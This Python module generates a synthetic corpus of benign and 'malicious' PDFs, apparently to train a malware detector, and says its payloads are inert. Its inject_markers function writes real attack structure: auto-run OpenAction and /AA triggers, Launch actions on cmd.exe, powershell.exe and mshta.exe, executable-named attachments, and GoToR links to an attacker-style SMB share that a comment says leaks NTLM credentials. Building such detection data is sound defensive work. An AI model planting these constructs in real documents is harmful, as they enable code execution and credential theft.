"""Builders for the synthetic training corpus.

Benign documents are generated with reportlab and vary in length, layout,
links, forms, attachments and encryption.

"Malicious" documents start as the same kind of benign-looking document and
then get the structural markers seen in real PDF malware injected with
pikepdf: auto-run JavaScript, event-triggered actions, launch actions and
dropped attachments. Benign documents get realistic JavaScript too (form
helpers, calculations, print-on-open), so "has JavaScript" alone cannot
separate the classes. Malicious JavaScript is obfuscated but inert (see
jsgen.py), the launch targets do not exist, and attachments are placeholder
text -- there is no exploit code anywhere in this project.
"""

from __future__ import annotations

import io
import random

import pikepdf
from reportlab.lib.pagesizes import A4, letter
from reportlab.lib.pdfencrypt import StandardEncryption
from reportlab.pdfgen import canvas

from .jsgen import benign_document_script, benign_field_script, benign_open_script, malicious_script

_WORDS = (
    "quarterly revenue invoice account policy shipment contract schedule "
    "report summary meeting agenda customer project budget review payment "
    "delivery order statement balance notice update client service terms "
    "analysis growth market strategy team office annual department"
).split()

_TITLES = [
    "Invoice", "Quarterly Report", "Meeting Minutes", "Shipping Notice",
    "Account Statement", "Project Proposal", "Purchase Order", "Resume",
    "Payment Reminder", "Policy Update", "Delivery Confirmation", "Contract",
]

_LINKS = [
    "https://example.com", "https://example.org/docs", "https://example.net/help",
    "https://example.com/invoice/view", "https://example.org/track",
]


def _sentence(rng: random.Random) -> str:
    words = rng.choices(_WORDS, k=rng.randint(6, 14))
    return " ".join(words).capitalize() + "."


def build_document(
    rng: random.Random,
    *,
    pages: int | None = None,
    links: int | None = None,
    form: bool | None = None,
    encrypt: bool | None = None,
) -> bytes:
    """Build an ordinary-looking PDF and return its bytes."""
    pages = pages if pages is not None else rng.choice([1, 1, 1, 2, 2, 3, 4, 6, 8, 12])
    links = links if links is not None else (rng.randint(1, 4) if rng.random() < 0.35 else 0)
    form = form if form is not None else rng.random() < 0.15
    encrypt = encrypt if encrypt is not None else rng.random() < 0.12

    buf = io.BytesIO()
    kwargs = {"pagesize": rng.choice([A4, letter])}
    if encrypt:
        # Empty user password: opens without a prompt, like most real
        # "encrypted" PDFs that only restrict printing/copying.
        kwargs["encrypt"] = StandardEncryption("", ownerPassword="owner", canPrint=1)
    c = canvas.Canvas(buf, **kwargs)
    width, height = kwargs["pagesize"]
    title = rng.choice(_TITLES)

    for page in range(pages):
        y = height - 72
        c.setFont("Helvetica-Bold", 16)
        c.drawString(72, y, f"{title} - page {page + 1}")
        y -= 30
        c.setFont("Helvetica", 10)
        for _ in range(rng.randint(8, 45)):
            c.drawString(72, y, _sentence(rng)[:95])
            y -= 14
            if y < 90:
                break
        if rng.random() < 0.3:
            c.rect(72, 100, rng.randint(100, 400), rng.randint(20, 60))
        if page == 0:
            for i in range(links):
                url = rng.choice(_LINKS)
                c.drawString(72, 60 + i * 12, url)
                c.linkURL(url, (72, 58 + i * 12, 300, 70 + i * 12), relative=0)
            if form:
                # Varying field counts: a fixed count would let the model
                # learn "number of /AA dictionaries" instead of behaviour.
                names = rng.sample(["name", "qty", "price", "total", "date", "phone", "email", "amount"],
                                   k=rng.randint(1, 6))
                for i, fname in enumerate(names):
                    c.acroForm.textfield(name=fname, x=320, y=60 + 24 * i, width=200, height=18)
                if rng.random() < 0.5:
                    c.acroForm.checkbox(name="agree", x=300, y=60, size=14)
        c.showPage()
    c.save()
    return buf.getvalue()


def _save(pdf: pikepdf.Pdf) -> bytes:
    """Save, keeping encryption if the source was encrypted (pikepdf drops it
    by default, which would make "encrypted" a benign-only artifact)."""
    out = io.BytesIO()
    if pdf.is_encrypted:
        pdf.save(out, encryption=pikepdf.Encryption(owner="owner", user=""))
    else:
        pdf.save(out)
    return out.getvalue()


def _js_action(pdf: pikepdf.Pdf, script: str) -> pikepdf.Dictionary:
    return pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String(script)))


def _add_document_js(pdf: pikepdf.Pdf, scripts: list[str]) -> None:
    """Document-level JavaScript (/Names /JavaScript): runs when the file opens."""
    names = pikepdf.Array()
    for i, script in enumerate(scripts):
        names.append(pikepdf.String(f"script{i}"))
        names.append(_js_action(pdf, script))
    pdf.Root.Names = pdf.Root.get("/Names", pikepdf.Dictionary())
    pdf.Root.Names.JavaScript = pikepdf.Dictionary(Names=names)


def _add_xfa(pdf: pikepdf.Pdf) -> None:
    packet = pdf.make_stream(b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template/></xdp:xdp>')
    pdf.Root.AcroForm = pdf.Root.get("/AcroForm", pikepdf.Dictionary(Fields=pikepdf.Array()))
    pdf.Root.AcroForm.XFA = pikepdf.Array([pikepdf.String("template"), packet])


def _attach(pdf: pikepdf.Pdf, name: str, data: bytes) -> None:
    pdf.attachments[name] = pikepdf.AttachedFileSpec(pdf, data, filename=name)


def add_attachment(pdf_bytes: bytes, name: str, data: bytes) -> bytes:
    with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
        _attach(pdf, name, data)
        return _save(pdf)


def inject_markers(pdf_bytes: bytes, rng: random.Random) -> bytes:
    """Inject a random combination of malicious structural markers.

    Every sample gets at least one automatic trigger (OpenAction, /AA or
    document-level JavaScript), because an attack that needs no user click
    is what defines the class.
    """
    with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
        trigger = rng.choice(["open_action", "page_aa", "both", "document_js"])
        payload = rng.choices(["js", "launch", "js+embedded", "remote_gotor"], weights=[5, 2, 3, 1])[0]

        dropped = None
        if "embedded" in payload:
            dropped = rng.choice(["invoice.exe", "update.scr", "doc.vbs", "readme.js", "setup.bat"])
            _attach(pdf, dropped, b"PDFSHIELD-INERT-PLACEHOLDER " * rng.randint(4, 200))

        def make_action() -> pikepdf.Dictionary:
            if payload == "remote_gotor":
                # Opening a file on an attacker's SMB share leaks the user's
                # NTLM credentials. The host is on the reserved .invalid TLD.
                host = "".join(rng.choices("abcdefghijklmnop", k=8))
                return pdf.make_indirect(pikepdf.Dictionary(
                    S=rng.choice([pikepdf.Name.GoToR, pikepdf.Name.GoToE]),
                    F=pikepdf.String(rng.choice([f"\\\\{host}.invalid\\share\\a.pdf",
                                                 f"//{host}.invalid/share/a.pdf"])),
                    D=pikepdf.Array([0, pikepdf.Name.Fit]),
                ))
            if payload == "launch":
                return pdf.make_indirect(pikepdf.Dictionary(
                    S=pikepdf.Name.Launch,
                    F=pikepdf.String(rng.choice(["cmd.exe", "powershell.exe", "/bin/sh", "mshta.exe"])),
                    NewWindow=False,
                ))
            return _js_action(pdf, malicious_script(rng, dropped))

        if trigger == "document_js" and payload in ("js", "js+embedded"):
            _add_document_js(pdf, [malicious_script(rng, dropped)])
        else:
            if trigger in ("open_action", "both", "document_js"):
                pdf.Root.OpenAction = make_action()
            if trigger in ("page_aa", "both"):
                for page in pdf.pages[: rng.randint(1, 3)]:
                    page.obj.AA = pikepdf.Dictionary({rng.choice(["/O", "/C"]): make_action()})

        if rng.random() < 0.1:
            _add_xfa(pdf)
        return _save(pdf)


def add_benign_js(pdf_bytes: bytes, rng: random.Random) -> bytes:
    """Add the kinds of JavaScript legitimate documents carry."""
    with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
        fields = list(pdf.Root.AcroForm.Fields) if "/AcroForm" in pdf.Root else []
        kinds = [k for k in ("field", "open", "document") if k != "field" or fields]
        for kind in rng.sample(kinds, k=rng.randint(1, len(kinds))):
            if kind == "field":
                for field in rng.sample(fields, k=rng.randint(1, len(fields))):
                    key, script = benign_field_script(rng)
                    field.AA = pikepdf.Dictionary({key: _js_action(pdf, script)})
            elif kind == "open":
                pdf.Root.OpenAction = _js_action(pdf, benign_open_script(rng))
            else:
                _add_document_js(pdf, [benign_document_script(rng) for _ in range(rng.randint(1, 3))])
        if fields and rng.random() < 0.3:
            _add_xfa(pdf)
        return _save(pdf)


def add_navigation_open_action(pdf_bytes: bytes, rng: random.Random) -> bytes:
    """Open-at-page /OpenAction, as written by Word, LibreOffice and others.

    It only moves the view, but it shares the /OpenAction key with auto-run
    attacks, so the benign class needs it too.
    """
    with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
        page = pdf.pages[0].obj
        if rng.random() < 0.5:
            pdf.Root.OpenAction = pikepdf.Array([page, pikepdf.Name.XYZ, None, None, 0])
        else:
            pdf.Root.OpenAction = pikepdf.Dictionary(S=pikepdf.Name.GoTo, D=pikepdf.Array([page, pikepdf.Name.Fit]))
        return _save(pdf)


def add_document_links(pdf_bytes: bytes, rng: random.Random) -> bytes:
    """Links that open other local documents (/GoToR, /Launch of a .pdf),
    common in manuals, patents and document bundles."""
    with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
        page = pdf.pages[0].obj
        page.Annots = page.get("/Annots", pikepdf.Array())
        for i in range(rng.randint(1, 6)):
            target = pikepdf.String(rng.choice(["appendix.pdf", "chapter2.pdf", "toolkit.pdf", "docs/help"]))
            action = (pikepdf.Dictionary(S=pikepdf.Name.GoToR, F=target, D=pikepdf.Array([0, pikepdf.Name.Fit]))
                      if rng.random() < 0.6 else pikepdf.Dictionary(S=pikepdf.Name.Launch, F=target))
            page.Annots.append(pdf.make_indirect(pikepdf.Dictionary(
                Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link,
                Rect=[72, 40 + 12 * i, 200, 50 + 12 * i], Border=[0, 0, 0], A=action)))
        return _save(pdf)


def build_benign(rng: random.Random) -> bytes:
    with_js = rng.random() < 0.25
    data = build_document(rng, form=rng.random() < 0.6) if with_js else build_document(rng)
    if with_js:
        data = add_benign_js(data, rng)
    elif rng.random() < 0.3:
        data = add_navigation_open_action(data, rng)
    if rng.random() < 0.05:
        data = add_document_links(data, rng)
    if rng.random() < 0.08:
        # Legitimate attachments exist too (spreadsheets, source data...).
        name = rng.choice(["data.csv", "appendix.txt", "figures.xlsx"])
        data = add_attachment(data, name, b"col_a,col_b\n1,2\n" * rng.randint(2, 100))
    return data


def build_malicious(rng: random.Random) -> bytes:
    return inject_markers(build_document(rng), rng)


def build_calculating_form() -> bytes:
    """A legitimate order form whose total field is computed with JavaScript.

    This is the documented false-positive case: it uses the same /AA +
    JavaScript mechanism as malware, for an entirely benign purpose.
    """
    rng = random.Random(0)
    data = build_document(rng, pages=1, links=0, form=True, encrypt=False)
    with pikepdf.open(io.BytesIO(data)) as pdf:
        field = pdf.Root.AcroForm.Fields[0]
        field.AA = pikepdf.Dictionary(C=pdf.make_indirect(pikepdf.Dictionary(
            S=pikepdf.Name.JavaScript,
            JS=pikepdf.String('event.value = this.getField("qty").value * 9.99;'),
        )))
        return _save(pdf)
